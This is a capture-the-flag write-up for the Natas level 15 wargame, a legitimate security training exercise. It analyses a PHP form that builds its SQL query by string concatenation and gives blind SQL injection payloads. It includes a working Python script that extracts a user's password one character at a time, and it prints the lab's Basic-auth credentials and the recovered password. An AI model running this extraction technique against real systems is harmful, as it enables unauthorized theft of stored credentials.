# Level 15

## Software used
- Google Chrome + FoxyProxy
- Burpsuite Community
- [onlinephp.io](https://onlinephp.io/)

## Hint
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```

## Solution

### Code Analysis

```
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/
```
It is actually a comment but it may be useful since it gives us a clue about the maximum length of usernames and passwords, and that the default value if NULL.  
[VARCHAR](https://dev.mysql.com/doc/refman/8.0/en/char.html): The CHAR and VARCHAR types are similar, but differ in the way they are stored and retrieved. They also differ in maximum length and in whether trailing spaces are retained.  
[MYSQL DEFAULT VALUE](https://dev.mysql.com/doc/refman/8.0/en/data-type-defaults.html)
```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');
```
If key _username_ exists in the special array $\_REQUEST, then connect to the database _natas15_ on localhost (local to the server) using the username _natas15_ and password... which is censored.  

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }
```
Create the variable $query which holds the actual SQL query to be sent to the backend database.  

```php
$res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

The variable $res holds the response from the backend database:
- if the number of rows ([mysqli_num_rows](https://www.php.net/manual/en/mysqli-result.num-rows.php)) is greater than 0, then prints to screen ""This user exists.\<br>"
- if the number of rows is 0 or a negative integer, then prints "This user doesn't exist.\<br>"
- if the result is everything else, prints "Error in query.\<br>"

At the end of the script, the connection to the database is closed.

## Exploit

Injecting the payload `" OR 1=1-- ` the app prints to screen **This user exists.**. By contrast, using the payload `" OR 1=2-- ` we get **This user doesn't exist.**.
```php
<?php

$array = array(
	
	"username" => '" OR 1=1-- ',
	/*"password" => '" OR 1=1-- ',*/
);

$query = "SELECT * from users where username=\"".$array["username"]."\"";

echo $query

?>
_____

SELECT * from users where username="" OR 1=1-- "
```
Testing for the username _natas16_ we find it to exist in the database.  

Now that we have found a valid username, we need to extract its password. Once again we can infer from the error messages when our query is TRUE, when is FALSE, and even when it contains syntax errors.  

```php
 if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }
```
The source-code gives us another valuable piece of information: the php code begins checking if the key _username_ is presente in $\_REQUEST (which we know being an associative array contaning the contents of $\_GET, $\_POST, and $\_COOKIE) meaning that GET requests may be accepted. If we can actually pass the parameter through GET requests, we can add a second parameter _debug=true_ and have the application to print the query passed to the backend database.  
```php
if(array_key_exists("username", $_REQUEST))
[...]
	if(array_key_exists("debug", $_GET)) {
        	echo "Executing query: $query<br>";
    	}
```  

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/b81614ba-5118-495d-9498-ecb76810ca93" width=900 height=auto>

Putting all pieces together we can enumerate the password of known users one character at a time, starting from determining the actual password length.  

Payload:` ' AND (SELECT username FROM users WHERE username='natas16' and LENGTH(password)=1)='natas16'-- `  

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/d7a3845d-b0f3-4249-ac3a-8bf795c827cd" width=900 height=auto>  

Once we know the length of the password, we can start enumerating on character at a time.  

Payload: `' AND (SELECT SUBSTRING(BINARY+password, 1, 1) FROM users WHERE username='natas16')='a'-- `  
_BINARY is necessary to obtain a case sensitive response from the database_

Using BurpIntruder (instructed to grep match on expression "This user exists.") we can see that the first character of the password is **h**.  

Here a python script which takes the url of the lab as argument, checks password length for the hardcoded user and enumerate its password.  
```python
import requests
import urllib3
import sys
from string import ascii_lowercase, ascii_uppercase

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# SEND ALL TRAFFIC THROUGH THE PROXY, BURP PROXY IN THIS CASE
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

# FUNCTION TO DETERMINE THE LENGTH OF THE PASSWORD
def find_psw_length(username, index_url, auth):
    for i in range(0, 100):
        payload = index_url+'?username={0}"+AND+(SELECT+username+FROM+users+WHERE+username="{0}"+and+LENGTH(password)={1})="{0}"--+&debug=true'.format(username, i)
        sys.stdout.write("[+] Testing length... {0}\r".format(i))
        sys.stdout.flush()
        sys.stdout.write("\033[k")
        r = requests.get(payload, headers=auth, proxies=proxies, verify=False)
        if "This user exists." in r.text:
            print("\n[+] Password length is %i" % i)
            return i
    # If max value is out of range    
    print("\n[-] Could not determine the password length")
    sys.exit(-1)

# FUNCTION TO DETERMINE THE ACTUAL PASSWORD
def enumerate_psw(index_url, username, auth, password_length):
    # Create a string with all possible characters the password may include
    chars = ascii_lowercase+ascii_uppercase+"0123456789"
    # Initialize the password variable to be empty
    password = ""
    # For every index (position) test if the characters is correct
    for i in range(1, password_length+1):
        for j in chars:
            payload = index_url+'?username={0}"+AND+(SELECT+SUBSTRING(BINARY+password,{1},1)+FROM+users+WHERE+username="{0}")="{2}"--+&debug=true'.format(username, i, j)
            r = requests.get(payload, headers=auth, proxies=proxies, verify=False)
            # If it is correct, update the variable password and break the execution to skip over to the next index
            if "This user exists." in r.text:
                password = password + j
                break
            sys.stdout.write("[+] Password: {0}{1}\r".format(password, j))
            sys.stdout.flush()
            sys.stdout.write("\033[k")
    if password:
        return password
    else:
        print("\n[-] Something went wrong!")


def main():
    # If the wrong number of argument is supplied, print error message
    if len(sys.argv) != 2:
        print("[-] Usage: %s url" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    index_url = url + '/index.php'
    
    # Authorization header
    auth = {
        'Authorization' : 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='
    }

    username = 'natas16'
    print("[+] Let's find out the password length")
    password_length = find_psw_length(username, index_url, auth)
    
    if password_length:
        print("[+] Let's proceed and identify the password's characters")
    
    password = enumerate_psw(index_url, username, auth, password_length)
    print("[+] The password is %s" % password)

if __name__ == "__main__":
    main()
```
<img src="https://github.com/jupitersinsight/writeups/assets/110602224/7e46dcfc-6382-4d51-9ac6-241d1ef55200" width=450 height=auto>

The password is: **TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V**
